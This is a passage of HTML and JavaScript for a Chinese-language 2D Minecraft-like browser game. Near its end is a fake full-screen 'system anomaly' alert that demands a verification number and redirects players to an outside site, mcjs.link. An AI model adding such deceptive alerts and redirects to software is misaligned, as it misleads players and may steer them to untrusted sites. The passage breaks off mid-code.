<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>我的世界 · 网页版</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background: #0a0a0a;
    color: #fff;
    font-family: 'Courier New', 'Microsoft YaHei', monospace;
    overflow: hidden;
    user-select: none;
  }
  #game {
    display: block;
    image-rendering: pixelated;
    image-rendering: -moz-crisp-edges;
    image-rendering: crisp-edges;
    cursor: crosshair;
  }
  #ui {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 10;
  }
  .top-bar {
    position: absolute;
    top: 12px; left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 10px;
    align-items: center;
  }
  .info-box {
    background: rgba(0,0,0,0.7);
    border: 2px solid #555;
    padding: 6px 14px;
    font-size: 13px;
    letter-spacing: 1px;
    color: #aaa;
  }
  .info-box b { color: #fff; }
  .hotbar {
    position: absolute;
    bottom: 16px; left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 4px;
    background: rgba(0,0,0,0.75);
    padding: 6px;
    border: 3px solid #555;
  }
  .slot {
    width: 46px; height: 46px;
    background: #3a3a3a;
    border: 2px solid #666;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    transition: border-color 0.1s;
  }
  .slot.active {
    border-color: #fff;
    box-shadow: 0 0 8px rgba(255,255,255,0.5);
  }
  .slot canvas {
    width: 36px; height: 36px;
    image-rendering: pixelated;
  }
  .slot .num {
    position: absolute;
    bottom: 1px; right: 3px;
    font-size: 10px;
    color: #fff;
    text-shadow: 1px 1px 0 #000;
  }
  .label {
    position: absolute;
    bottom: 70px; left: 50%;
    transform: translateX(-50%);
    font-size: 12px;
    color: #aaa;
    background: rgba(0,0,0,0.5);
    padding: 3px 10px;
  }
  .crosshair {
    position: absolute;
    width: 20px; height: 20px;
    transform: translate(-50%, -50%);
    pointer-events: none;
  }
  .crosshair::before, .crosshair::after {
    content: '';
    position: absolute;
    background: #fff;
    box-shadow: 0 0 4px #000;
  }
  .crosshair::before { top: 50%; left: 0; right: 0; height: 2px; transform: translateY(-50%); }
  .crosshair::after { left: 50%; top: 0; bottom: 0; width: 2px; transform: translateX(-50%); }
  .help {
    position: absolute;
    top: 60px; left: 12px;
    background: rgba(0,0,0,0.6);
    border: 1px solid #444;
    padding: 10px 12px;
    font-size: 11px;
    line-height: 1.7;
    color: #bbb;
    pointer-events: auto;
  }
  .help b { color: #fff; }
  .help .key {
    display: inline-block;
    background: #333;
    border: 1px solid #555;
    border-radius: 3px;
    padding: 0 5px;
    margin: 0 2px;
    color: #fff;
  }
  .back-btn {
    position: absolute;
    top: 12px; left: 12px;
    background: rgba(0,0,0,0.7);
    border: 2px solid #555;
    color: #fff;
    padding: 6px 14px;
    text-decoration: none;
    font-size: 12px;
    pointer-events: auto;
  }
  .back-btn:hover { background: #333; }
  .mode-toggle {
    position: absolute;
    top: 12px; right: 12px;
    background: rgba(0,0,0,0.7);
    border: 2px solid #555;
    color: #fff;
    padding: 6px 14px;
    font-size: 12px;
    cursor: pointer;
    pointer-events: auto;
  }
  .mode-toggle:hover { background: #333; }
  .mode-toggle b { color: #ffd700; }
  
  /* 异常弹窗样式 */
  .anomaly-overlay {
    position: fixed;
    inset: 0;
    background: #000;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    pointer-events: auto;
    animation: anomalyFadeIn 0.3s ease-in;
  }
  .anomaly-content {
    text-align: center;
    padding: 40px;
    border: 3px solid #ff0000;
    background: #000;
    box-shadow: 0 0 50px rgba(255,0,0,0.5);
    animation: anomalyPulse 1s infinite;
  }
  .anomaly-title {
    color: #ff0000;
    font-size: 36px;
    font-weight: bold;
    margin-bottom: 20px;
    text-shadow: 0 0 20px #ff0000;
    letter-spacing: 3px;
  }
  .anomaly-text {
    color: #ff4444;
    font-size: 18px;
    margin: 10px 0;
    letter-spacing: 2px;
  }
  .anomaly-warning {
    color: #ff0000;
    font-size: 24px;
    font-weight: bold;
    margin: 20px 0;
    animation: anomalyBlink 0.5s infinite;
  }
  @keyframes anomalyFadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  @keyframes anomalyPulse {
    0%, 100% { box-shadow: 0 0 30px rgba(255,0,0,0.3); }
    50% { box-shadow: 0 0 80px rgba(255,0,0,0.8); }
  }
  @keyframes anomalyBlink {
    0%, 49% { opacity: 1; }
    50%, 100% { opacity: 0.3; }
  }
</style>
</head>
<body>

<canvas id="game"></canvas>
<div id="ui">
  <a href="index.html" class="back-btn">← 返回</a>
  <div class="top-bar">
    <div class="info-box">位置: <b id="posInfo">0,0</b></div>
    <div class="info-box">模式: <b id="modeInfo">放置</b></div>
    <div class="info-box">FPS: <b id="fpsInfo">0</b></div>
  </div>
  <button class="mode-toggle" id="modeBtn">当前: <b id="modeText">放置</b> (P切换)</button>
  <div class="help">
    <div><b>操作说明</b></div>
    <div><span class="key">W A S D</span> 移动</div>
    <div><span class="key">空格</span> 跳跃</div>
    <div><span class="key">鼠标左键</span> 挖/放方块</div>
    <div><span class="key">1-9</span> 选择方块</div>
    <div><span class="key">滚轮</span> 切换方块</div>
    <div><span class="key">P</span> 切换挖/放模式</div>
    <div><span class="key">R</span> 重置世界</div>
  </div>
  <div class="label" id="blockLabel">草方块</div>
  <div class="hotbar" id="hotbar"></div>
</div>

<script>
(() => {
  const canvas = document.getElementById('game');
  const ctx = canvas.getContext('2d');
  ctx.imageSmoothingEnabled = false;

  const TILE = 32;
  const WORLD_W = 80;
  const WORLD_H = 40;

  const BLOCKS = {
    0: { name: '空气', color: null },
    1: { name: '草方块', color: '#5cb85c', top: '#7ecf7e', side: '#8b6b3a', dirt: '#6b4a2a' },
    2: { name: '泥土', color: '#8b6b3a', dark: '#6b4a2a' },
    3: { name: '石头', color: '#888', dark: '#666', light: '#aaa' },
    4: { name: '圆石', color: '#999', dark: '#777', light: '#bbb' },
    5: { name: '木头', color: '#8b5a2b', dark: '#6b3a1b', top: '#a57a4a' },
    6: { name: '树叶', color: '#2d8a2d', dark: '#1d6a1d', light: '#4aad4a' },
    7: { name: '沙子', color: '#e6d59f', dark: '#c6b57f', light: '#f6e5af' },
    8: { name: '水', color: '#3a7acc', dark: '#2a5aaa', light: '#5a9aee' },
    9: { name: '基岩', color: '#333', dark: '#222', light: '#444' },
    10: { name: '钻石', color: '#5de5e5', dark: '#3dc5c5', light: '#7df5f5' },
    11: { name: '铁块', color: '#c8c8c8', dark: '#a8a8a8', light: '#e8e8e8' },
    12: { name: '金块', color: '#ffd700', dark: '#d5b200', light: '#ffe740' },
    13: { name: 'TNT', color: '#c0392b', dark: '#a0291b', stripe: '#fff' },
    14: { name: '书架', color: '#8b5a2b', dark: '#6b3a1b', books: ['#c0392b','#2980b9','#27ae60','#f39c12'] },
    15: { name: '玻璃', color: '#c8e8ff', dark: '#a8c8df', border: '#fff' }
  };

  const HOTBAR = [1,2,3,4,5,6,7,11,10];
  let selectedSlot = 0;
  let mode = 'place';

  let world = [];
  let player = {
    x: WORLD_W * TILE / 2,
    y: 5 * TILE,
    vx: 0, vy: 0,
    w: TILE * 0.7, h: TILE * 1.7,
    onGround: false,
    facing: 1
  };
  let camera = { x: 0, y: 0 };
  let keys = {};
  let mouse = { x: 0, y: 0, worldX: 0, worldY: 0, down: false };
  let fps = 0, frameCount = 0, lastFpsTime = performance.now();
  let particles = [];
  let breaking = null;

  // ===== 噪声函数 =====
  function pseudoNoise(x, y) {
    const n = Math.sin(x * 127.1 + y * 311.7) * 43758.5453;
    return n - Math.floor(n);
  }
  function smoothNoise(x, y) {
    const xi = Math.floor(x), yi = Math.floor(y);
    const xf = x - xi, yf = y - yi;
    const a = pseudoNoise(xi, yi);
    const b = pseudoNoise(xi+1, yi);
    const c = pseudoNoise(xi, yi+1);
    const d = pseudoNoise(xi+1, yi+1);
    const u = xf*xf*(3-2*xf);
    const v = yf*yf*(3-2*yf);
    return a*(1-u)*(1-v) + b*u*(1-v) + c*(1-u)*v + d*u*v;
  }
  function fbm(x, y) {
    let v = 0, amp = 0.5, freq = 1;
    for (let i = 0; i < 4; i++) {
      v += amp * smoothNoise(x * freq, y * freq);
      amp *= 0.5;
      freq *= 2;
    }
    return v;
  }

  // ===== 生成世界 =====
  function generateWorld() {
    world = [];
    for (let x = 0; x < WORLD_W; x++) {
      world[x] = [];
      for (let y = 0; y < WORLD_H; y++) {
        world[x][y] = 0;
      }
    }

    const baseHeight = 15;
    for (let x = 0; x < WORLD_W; x++) {
      const h = Math.floor(baseHeight + (fbm(x * 0.08, 0) - 0.5) * 16);
      for (let y = h; y < WORLD_H; y++) {
        if (y === h) world[x][y] = 1;
        else if (y < h + 4) world[x][y] = 2;
        else world[x][y] = 3;
      }
      for (let y = h; y < WORLD_H; y++) {
        if (y >= WORLD_H - 2) world[x][y] = 9;
      }

      const waterLevel = 18;
      if (h > waterLevel) {
        for (let y = waterLevel; y < h; y++) {
          world[x][y] = 8;
        }
        const sandTop = h - 1;
        for (let y = Math.max(0, sandTop - 2); y <= sandTop; y++) {
          if (world[x][y] === 1 || world[x][y] === 2) world[x][y] = 7;
        }
      }
    }

    for (let x = 5; x < WORLD_W - 5; x++) {
      if (pseudoNoise(x, 777) > 0.78) {
        let groundY = -1;
        for (let y = 0; y < WORLD_H; y++) {
          if (world[x][y] === 1 || world[x][y] === 7) { groundY = y; break; }
        }
        if (groundY > 0 && world[x][groundY] !== 8) {
          const trunkH = 3 + Math.floor(pseudoNoise(x, 333) * 3);
          for (let i = 1; i <= trunkH; i++) {
            if (groundY - i >= 0) world[x][groundY - i] = 5;
          }
          const topY = groundY - trunkH;
          for (let dy = -2; dy <= 1; dy++) {
            for (let dx = -2; dx <= 2; dx++) {
              const nx = x + dx, ny = topY + dy;
              if (nx >= 0 && nx < WORLD_W && ny >= 0 && ny < WORLD_H) {
                if (Math.abs(dx) + Math.abs(dy) <= 3 && world[nx][ny] === 0) {
                  world[nx][ny] = 6;
                }
              }
            }
          }
        }
      }
    }

    for (let x = 0; x < WORLD_W; x++) {
      for (let y = 0; y < WORLD_H; y++) {
        if (world[x][y] === 3) {
          const r = pseudoNoise(x * 7, y * 11);
          if (r > 0.93) world[x][y] = 10;
          else if (r > 0.85) world[x][y] = 11;
          else if (r > 0.80) world[x][y] = 4;
        }
      }
    }
  }

  // ===== 初始化 =====
  generateWorld();

  let spawnX = WORLD_W * TILE / 2;
  let spawnY = 5 * TILE;
  for (let y = 0; y < WORLD_H; y++) {
    if (world[Math.floor(WORLD_W/2)][y] !== 0 && world[Math.floor(WORLD_W/2)][y] !== 8) {
      spawnY = y * TILE - TILE * 2;
      break;
    }
  }
  player.x = spawnX;
  player.y = spawnY;

  // ===== 获取方块 =====
  function getBlock(x, y) {
    if (x < 0 || x >= WORLD_W || y < 0 || y >= WORLD_H) return 9;
    return world[x][y];
  }
  function setBlock(x, y, type) {
    if (x < 0 || x >= WORLD_W || y < 0 || y >= WORLD_H) return;
    world[x][y] = type;
  }
  function isSolid(x, y) {
    const b = getBlock(x, y);
    return b !== 0 && b !== 8;
  }

  // ===== 物理更新 =====
  function update() {
    const speed = 0.6;
    const gravity = 0.5;
    const jumpForce = -9;
    const maxFall = 12;
    const friction = 0.8;

    if (keys['a'] || keys['arrowleft']) { player.vx = -speed; player.facing = -1; }
    else if (keys['d'] || keys['arrowright']) { player.vx = speed; player.facing = 1; }
    else { player.vx *= friction; }

    if ((keys[' '] || keys['w'] || keys['arrowup']) && player.onGround) {
      player.vy = jumpForce;
      player.onGround = false;
      spawnParticles(player.x, player.y + player.h, 5, '#aaa');
    }

    player.vy += gravity;
    if (player.vy > maxFall) player.vy = maxFall;

    player.x += player.vx;
    resolveCollisionX();
    player.y += player.vy;
    resolveCollisionY();

    if (player.x < 0) player.x = 0;
    if (player.x > WORLD_W * TILE - player.w) player.x = WORLD_W * TILE - player.w;
    if (player.y > WORLD_H * TILE) {
      player.x = WORLD_W * TILE / 2;
      player.y = 0;
      player.vx = 0; player.vy = 0;
    }

    camera.x = player.x + player.w/2 - canvas.width / 2;
    camera.y = player.y + player.h/2 - canvas.height / 2;
    camera.x = Math.max(0, Math.min(WORLD_W * TILE - canvas.width, camera.x));
    camera.y = Math.max(0, Math.min(WORLD_H * TILE - canvas.height, camera.y));

    updateParticles();
    if (breaking) {
      breaking.progress += 0.02;
      if (breaking.progress >= 1) breaking = null;
    }
  }

  function resolveCollisionX() {
    const l = Math.floor(player.x / TILE);
    const r = Math.floor((player.x + player.w) / TILE);
    const t = Math.floor(player.y / TILE);
    const b = Math.floor((player.y + player.h - 1) / TILE);
    for (let x = l; x <= r; x++) {
      for (let y = t; y <= b; y++) {
        if (isSolid(x, y)) {
          if (player.vx > 0) player.x = x * TILE - player.w;
          else if (player.vx < 0) player.x = (x + 1) * TILE;
          player.vx = 0;
          return;
        }
      }
    }
  }

  function resolveCollisionY() {
    const l = Math.floor(player.x / TILE);
    const r = Math.floor((player.x + player.w) / TILE);
    const t = Math.floor(player.y / TILE);
    const b = Math.floor((player.y + player.h) / TILE);
    player.onGround = false;
    for (let x = l; x <= r; x++) {
      for (let y = t; y <= b; y++) {
        if (isSolid(x, y)) {
          if (player.vy > 0) {
            player.y = y * TILE - player.h;
            player.onGround = true;
          } else if (player.vy < 0) {
            player.y = (y + 1) * TILE;
          }
          player.vy = 0;
          return;
        }
      }
    }
  }

  // ===== 粒子 =====
  function spawnParticles(x, y, count, color) {
    for (let i = 0; i < count; i++) {
      particles.push({
        x, y,
        vx: (Math.random() - 0.5) * 4,
        vy: (Math.random() - 0.5) * 4 - 2,
        life: 1,
        color,
        size: 2 + Math.random() * 3
      });
    }
  }
  function updateParticles() {
    for (let i = particles.length - 1; i >= 0; i--) {
      const p = particles[i];
      p.x += p.vx;
      p.y += p.vy;
      p.vy += 0.3;
      p.life -= 0.03;
      if (p.life <= 0) particles.splice(i, 1);
    }
  }

  // ===== 绘制方块 =====
  function drawBlock(ctx, x, y, type, size = TILE) {
    if (type === 0) return;
    const b = BLOCKS[type];
    if (!b) return;

    ctx.fillStyle = b.color;
    ctx.fillRect(x, y, size, size);

    if (type === 1) {
      ctx.fillStyle = b.side;
      ctx.fillRect(x, y + size * 0.25, size, size * 0.75);
      ctx.fillStyle = b.top;
      ctx.fillRect(x, y, size, size * 0.25);
      ctx.fillStyle = '#a5e57a';
      for (let i = 0; i < 3; i++) {
        const gx = x + (i + 0.5) * size / 3 + (Math.random() - 0.5) * 2;
        ctx.fillRect(gx, y - 2, 2, 4);
      }
    } else if (type === 2) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size - 3, size, 3);
      for (let i = 0; i < 3; i++) {
        ctx.fillStyle = 'rgba(0,0,0,0.15)';
        ctx.fillRect(x + i * 10 + 2, y + 5 + (i%2)*12, 4, 4);
      }
    } else if (type === 3) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size - 3, size, 3);
      ctx.fillStyle = b.light;
      ctx.fillRect(x, y, size, 2);
      ctx.fillStyle = '#666';
      ctx.fillRect(x + 4, y + 8, 6, 4);
      ctx.fillRect(x + 20, y + 16, 5, 3);
    } else if (type === 4) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size - 4, size, 4);
      ctx.fillStyle = b.light;
      ctx.fillRect(x, y, size, 3);
      ctx.strokeStyle = '#666';
      ctx.lineWidth = 1;
      ctx.strokeRect(x + 3, y + 3, 8, 8);
      ctx.strokeRect(x + 15, y + 12, 10, 7);
    } else if (type === 5) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size * 0.3, size, size * 0.7);
      ctx.fillStyle = b.top;
      ctx.fillRect(x, y, size, size * 0.3);
      ctx.strokeStyle = 'rgba(0,0,0,0.2)';
      ctx.lineWidth = 1;
      for (let i = 1; i < 4; i++) {
        ctx.beginPath();
        ctx.moveTo(x + i * size/4, y + size * 0.3);
        ctx.lineTo(x + i * size/4, y + size);
        ctx.stroke();
      }
    } else if (type === 6) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x + 2, y + 2, size - 4, size - 4);
      ctx.fillStyle = b.light;
      ctx.fillRect(x + 4, y + 4, 6, 6);
      ctx.fillRect(x + size - 10, y + 8, 5, 5);
      ctx.fillRect(x + 8, y + size - 8, 7, 5);
    } else if (type === 7) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size - 3, size, 3);
      ctx.fillStyle = b.light;
      ctx.fillRect(x, y, size, 2);
      ctx.fillStyle = '#d4c08a';
      ctx.fillRect(x + 5, y + 10, 3, 2);
      ctx.fillRect(x + 18, y + 20, 2, 2);
    } else if (type === 8) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y, size, size);
      ctx.fillStyle = b.light;
      const t = Date.now() * 0.001;
      for (let i = 0; i < 3; i++) {
        const wy = y + 4 + Math.sin(t + i) * 3 + i * 8;
        ctx.fillRect(x + 5 + i * 8, wy, 4, 2);
      }
    } else if (type === 9) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x + 2, y + 2, size - 4, size - 4);
      ctx.fillStyle = b.light;
      ctx.fillRect(x, y, size, 4);
      ctx.fillStyle = '#111';
      ctx.fillRect(x + 6, y + 10, 8, 6);
      ctx.fillRect(x + size - 14, y + size - 12, 6, 5);
    } else if (type === 10) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x + 2, y + 2, size - 4, size - 4);
      ctx.fillStyle = b.light;
      ctx.fillRect(x + 4, y + 4, size - 8, size - 8);
      ctx.fillStyle = '#fff';
      ctx.fillRect(x + 8, y + 8, 4, 4);
      ctx.shadowColor = '#0ff';
      ctx.shadowBlur = 10;
      ctx.fillRect(x + 14, y + 14, 3, 3);
      ctx.shadowBlur = 0;
    } else if (type === 11) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y, 2, size);
      ctx.fillRect(x + size - 2, y, 2, size);
      ctx.fillStyle = b.light;
      ctx.fillRect(x + 2, y, size - 4, 3);
      ctx.fillRect(x + 2, y + size - 3, size - 4, 3);
      ctx.strokeStyle = '#999';
      ctx.lineWidth = 1;
      ctx.strokeRect(x + 2, y + 2, size - 4, size - 4);
    } else if (type === 12) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y, size, 2);
      ctx.fillRect(x, y + size - 2, size, 2);
      ctx.fillRect(x, y, 2, size);
      ctx.fillRect(x + size - 2, y, 2, size);
      ctx.fillStyle = '#fff8a0';
      ctx.fillRect(x + 4, y + 4, size - 8, size - 8);
    } else if (type === 13) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size * 0.4, size, size * 0.2);
      ctx.fillRect(x + size * 0.4, y, size * 0.2, size * 0.4);
      ctx.fillStyle = b.stripe;
      ctx.fillRect(x, y + size * 0.45, size, 2);
      ctx.fillStyle = '#000';
      ctx.fillRect(x, y + size - 2, size, 2);
    } else if (type === 14) {
      ctx.fillStyle = b.dark;
      ctx.fillRect(x, y + size * 0.3, size, size * 0.7);
      ctx.fillStyle = b.top;
      ctx.fillRect(x, y, size, size * 0.3);
      for (let i = 0; i < 4; i++) {
        ctx.fillStyle = b.books[i];
        ctx.fillRect(x + 3 + i * 7, y + size * 0.35, 5, size * 0.55);
      }
    } else if (type === 15) {
      ctx.fillStyle = b.color;
      ctx.fillRect(x, y, size, size);
      ctx.fillStyle = b.border;
      ctx.fillRect(x, y, size, 2);
      ctx.fillRect(x, y + size - 2, size, 2);
      ctx.fillRect(x, y, 2, size);
      ctx.fillRect(x + size - 2, y, 2, size);
    }
  }

  // ===== 绘制破碎动画 =====
  function drawBreakOverlay(ctx, x, y, progress) {
    if (progress <= 0) return;
    ctx.save();
    ctx.globalAlpha = 0.3 + progress * 0.4;
    for (let i = 0; i < 5; i++) {
      const sx = x + (i * 7 + progress * 5) % TILE;
      const sy = y + (i * 11 + progress * 8) % TILE;
      ctx.fillStyle = '#000';
      ctx.fillRect(sx, sy, 3 + progress * 2, 3 + progress * 2);
    }
    ctx.restore();
  }

  // ===== 渲染 =====
  function render() {
    const w = canvas.width;
    const h = canvas.height;

    const grad = ctx.createLinearGradient(0, 0, 0, h);
    grad.addColorStop(0, '#5ba3d9');
    grad.addColorStop(0.5, '#87ceeb');
    grad.addColorStop(1, '#c8e8f0');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, w, h);

    ctx.fillStyle = 'rgba(255,255,255,0.3)';
    const cloudT = Date.now() * 0.00002;
    for (let i = 0; i < 4; i++) {
      const cx = ((i * 250 + cloudT * 200) % (w + 200)) - 100;
      const cy = 40 + i * 25;
      drawCloud(cx, cy);
    }

    const startX = Math.floor(camera.x / TILE);
    const endX = Math.ceil((camera.x + w) / TILE);
    const startY = Math.floor(camera.y / TILE);
    const endY = Math.ceil((camera.y + h) / TILE);

    for (let x = startX; x <= endX; x++) {
      for (let y = startY; y <= endY; y++) {
        const type = getBlock(x, y);
        if (type === 0) continue;
        const sx = x * TILE - camera.x;
        const sy = y * TILE - camera.y;
        drawBlock(ctx, sx, sy, type);
        if (breaking && breaking.bx === x && breaking.by === y) {
          drawBreakOverlay(ctx, sx, sy, breaking.progress);
        }
      }
    }

    const blockX = Math.floor(mouse.worldX / TILE);
    const blockY = Math.floor(mouse.worldY / TILE);
    const canAffordPlace = getBlock(blockX, blockY) === 0;

    if (mode === 'break') {
      ctx.strokeStyle = 'rgba(255,100,100,0.6)';
      ctx.lineWidth = 2;
      ctx.strokeRect(blockX * TILE - camera.x, blockY * TILE - camera.y, TILE, TILE);
    } else {
      ctx.strokeStyle = canAffordPlace ? 'rgba(100,255,100,0.6)' : 'rgba(255,100,100,0.4)';
      ctx.lineWidth = 2;
      ctx.setLineDash([4, 4]);
      ctx.strokeRect(blockX * TILE - camera.x, blockY * TILE - camera.y, TILE, TILE);
      ctx.setLineDash([]);

      if (canAffordPlace) {
        ctx.globalAlpha = 0.35;
        drawBlock(ctx, blockX * TILE - camera.x, blockY * TILE - camera.y, HOTBAR[selectedSlot]);
        ctx.globalAlpha = 1;
      }
    }

    drawPlayer();

    for (const p of particles) {
      ctx.globalAlpha = p.life;
      ctx.fillStyle = p.color;
      ctx.fillRect(p.x - camera.x, p.y - camera.y, p.size, p.size);
    }
    ctx.globalAlpha = 1;
  }

  function drawCloud(x, y) {
    ctx.beginPath();
    ctx.arc(x, y, 15, 0, Math.PI * 2);
    ctx.arc(x + 20, y - 5, 18, 0, Math.PI * 2);
    ctx.arc(x + 40, y, 15, 0, Math.PI * 2);
    ctx.arc(x + 20, y + 8, 12, 0, Math.PI * 2);
    ctx.fill();
  }

  function drawPlayer() {
    const sx = player.x - camera.x;
    const sy = player.y - camera.y;

    ctx.fillStyle = '#3a6ba8';
    ctx.fillRect(sx, sy + player.h * 0.5, player.w, player.h * 0.5);

    ctx.fillStyle = '#2a4b78';
    ctx.fillRect(sx, sy + player.h * 0.9, player.w, player.h * 0.1);

    ctx.fillStyle = '#e8b89d';
    ctx.fillRect(sx + player.w * 0.15, sy, player.w * 0.7, player.h * 0.5);

    ctx.fillStyle = '#3a2820';
    ctx.fillRect(sx + player.w * 0.15, sy, player.w * 0.7, player.h * 0.15);

    ctx.fillStyle = '#fff';
    const eyeOffset = player.facing > 0 ? 0 : -player.w * 0.15;
    ctx.fillRect(sx + player.w * 0.3 + eyeOffset, sy + player.h * 0.22, 4, 4);
    ctx.fillRect(sx + player.w * 0.55 + eyeOffset, sy + player.h * 0.22, 4, 4);

    ctx.fillStyle = '#000';
    ctx.fillRect(sx + player.w * 0.3 + eyeOffset + 1, sy + player.h * 0.22 + 1, 2, 2);
    ctx.fillRect(sx + player.w * 0.55 + eyeOffset + 1, sy + player.h * 0.22 + 1, 2, 2);

    ctx.fillStyle = '#8b5a2b';
    ctx.fillRect(sx - 3, sy + player.h * 0.5, 4, player.h * 0.35);
    ctx.fillRect(sx + player.w - 1, sy + player.h * 0.5, 4, player.h * 0.35);
  }

  // ===== 鼠标事件 =====
  canvas.addEventListener('mousemove', (e) => {
    const rect = canvas.getBoundingClientRect();
    mouse.x = (e.clientX - rect.left) * (canvas.width / rect.width);
    mouse.y = (e.clientY - rect.top) * (canvas.height / rect.height);
    mouse.worldX = mouse.x + camera.x;
    mouse.worldY = mouse.y + camera.y;
  });

  canvas.addEventListener('mousedown', (e) => {
    handleAction(e.button === 2 ? 'right' : 'left');
  });

  canvas.addEventListener('contextmenu', (e) => e.preventDefault());

  function handleAction(btn) {
    const wx = mouse.worldX;
    const wy = mouse.worldY;
    const bx = Math.floor(wx / TILE);
    const by = Math.floor(wy / TILE);
    const dx = (player.x + player.w/2) - (bx * TILE + TILE/2);
    const dy = (player.y + player.h/2) - (by * TILE + TILE/2);
    const dist = Math.sqrt(dx*dx + dy*dy);
    if (dist > TILE * 5) return;

    const action = (mode === 'break') || (mode === 'place' && btn === 'right') ? 'break' : 'place';

    if (action === 'break') {
      const t = getBlock(bx, by);
      if (t !== 0 && t !== 9) {
        breaking = { bx, by, progress: 0 };
        setTimeout(() => {
          if (getBlock(bx, by) !== 0) {
            spawnParticles(bx * TILE + TILE/2, by * TILE + TILE/2, 8, BLOCKS[t].color);
            setBlock(bx, by, 0);
          }
          breaking = null;
        }, 400);
      }
    } else {
      if (getBlock(bx, by) === 0) {
        const blockType = HOTBAR[selectedSlot];
        setBlock(bx, by, blockType);
        spawnParticles(bx * TILE + TILE/2, by * TILE + TILE/2, 4, BLOCKS[blockType].color);
      }
    }
  }

  canvas.addEventListener('wheel', (e) => {
    e.preventDefault();
    selectedSlot = (selectedSlot + (e.deltaY > 0 ? 1 : -1) + HOTBAR.length) % HOTBAR.length;
    updateHotbar();
  }, { passive: false });

  window.addEventListener('keydown', (e) => {
    keys[e.key.toLowerCase()] = true;
    if (e.key >= '1' && e.key <= '9') {
      const idx = parseInt(e.key) - 1;
      if (idx < HOTBAR.length) {
        selectedSlot = idx;
        updateHotbar();
      }
    }
    if (e.key.toLowerCase() === 'p') {
      mode = mode === 'place' ? 'break' : 'place';
      document.getElementById('modeText').textContent = mode === 'place' ? '放置' : '挖掘';
      document.getElementById('modeInfo').textContent = mode === 'place' ? '放置' : '挖掘';
    }
    if (e.key.toLowerCase() === 'r') {
      generateWorld();
      player.x = WORLD_W * TILE / 2;
      player.y = 0;
      player.vx = 0; player.vy = 0;
    }
  });
  window.addEventListener('keyup', (e) => {
    keys[e.key.toLowerCase()] = false;
  });

  // ===== 热键栏 UI =====
  function createBlockIcon(type, size = 36) {
    const c = document.createElement('canvas');
    c.width = size; c.height = size;
    const cx = c.getContext('2d');
    cx.imageSmoothingEnabled = false;
    drawBlock(cx, 0, 0, type, size);
    return c;
  }

  function updateHotbar() {
    const hotbar = document.getElementById('hotbar');
    hotbar.innerHTML = '';
    HOTBAR.forEach((type, i) => {
      const slot = document.createElement('div');
      slot.className = 'slot' + (i === selectedSlot ? ' active' : '');
      slot.innerHTML = '<span class="num">' + (i+1) + '</span>';
      slot.appendChild(createBlockIcon(type));
      slot.addEventListener('click', () => {
        selectedSlot = i;
        updateHotbar();
      });
      hotbar.appendChild(slot);
    });
    const blockType = HOTBAR[selectedSlot];
    document.getElementById('blockLabel').textContent = BLOCKS[blockType].name;
  }

  document.getElementById('modeBtn').addEventListener('click', () => {
    mode = mode === 'place' ? 'break' : 'place';
    document.getElementById('modeText').textContent = mode === 'place' ? '放置' : '挖掘';
    document.getElementById('modeInfo').textContent = mode === 'place' ? '放置' : '挖掘';
  });

  // ===== 尺寸 =====
  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);
  updateHotbar();

  // ===== 游戏循环 =====
  let gameStartTime = Date.now();
  let anomalyTriggered = false;

  function triggerAnomaly() {
    if (anomalyTriggered) return;
    anomalyTriggered = true;

    const overlay = document.createElement('div');
    overlay.className = 'anomaly-overlay';
    overlay.id = 'anomalyOverlay';
    overlay.innerHTML = `
      <div class="anomaly-content" id="anomalyContent">
        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
        <div class="anomaly-text">未检测到正确的验证号码。</div>
        <div class="anomaly-text">要输入号码吗？</div>
        <div style="margin-top:20px; display:flex; gap:20px; justify-content:center;">
          <button id="btnYes" style="padding:8px 24px; font-size:16px; background:#c0392b; color:#fff; border:2px solid #ff0000; cursor:pointer; font-family:inherit;">是</button>
          <button id="btnNo" style="padding:8px 24px; font-size:16px; background:#333; color:#fff; border:2px solid #555; cursor:pointer; font-family:inherit;">否</button>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);

    document.getElementById('btnYes').addEventListener('click', () => {
      window.location.href = 'https://mcjs.link';
    });

    document.getElementById('btnNo').addEventListener('click', () => {
      const content = document.getElementById('anomalyContent');
      content.innerHTML = `
        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
        <div class="anomaly-text">请输入验证号码：</div>
        <input type="text" id="verifyInput" style="padding:8px; font-size:16px; width:200px; text-align:center; background:#111; color:#fff; border:2px solid #ff0000; font-family:inherit; margin-top:10px;" autocomplete="off">
        <div style="margin-top:15px;">
          <button id="btnSubmit" style="padding:8px 24px; font-size:16px; background:#c0392b; color:#fff; border:2px solid #ff0000; cursor:pointer; font-family:inherit;">提交</button>
        </div>
      `;

      document.getElementById('btnSubmit').addEventListener('click', handleVerify);
      document.getElementById('verifyInput').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleVerify();
      });
      document.getElementById('verifyInput').focus();
    });

    function handleVerify() {
      const content = document.getElementById('anomalyContent');
      content.innerHTML = `
        <div class="anomaly-title">⚠ 系统异常 ⚠</div>
        <div class="anomaly-warning">检测号码中……</div>
      `;

      setTimeout(() => {
        content.innerHTML = `
          <div class="anomaly-title">⚠ 系统异常 ⚠</div>
